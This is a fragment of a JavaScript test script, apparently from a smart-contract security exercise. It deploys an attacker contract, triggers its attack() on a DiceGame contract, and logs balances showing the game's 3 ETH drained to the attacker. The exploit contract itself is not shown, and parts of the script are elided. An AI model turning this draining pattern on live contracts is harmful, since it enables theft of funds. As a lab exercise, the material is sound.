...
async function diceAttack() { 
  ...
  await attackerdice.waitForDeployment();
  console.log("Bad contract deployed");

  address = await attackerdice.getAddress();
  let balanceETH = await ethers.provider.getBalance(diceGameContractAddress);
//   expect(balanceETH).to.equal(parseEther("3"));
  ...
  console.log(`DiceGame has ${await ethers.provider.getBalance(diceGameContractAddress)} ETH initially`);
  console.log(`AttackerDice has ${await ethers.provider.getBalance(address)} initially`);

  tx = await attackerdice.connect(contractOwner).attack();
  await tx.wait();

  console.log(`DiceGame has ${await ethers.provider.getBalance(diceGameContractAddress)} ETH now`);
  console.log(`AttackerDice has ${await ethers.provider.getBalance(address)} now`);
  
  console.log("Attack Executed");
  logtime();
  balanceETH = await ethers.provider.getBalance(diceGameContractAddress);
//   expect(balanceETH).to.equal(BigNumber.from("0"));
    console.log(`Balance of dice game is (should be 0) ${balanceETH}`);

  balanceETH = await ethers.provider.getBalance(address);
//   expect(balanceETH).to.equal(parseEther("3"));
    console.log(`Balance of attacker is (should be 3) ${balanceETH}`);
}
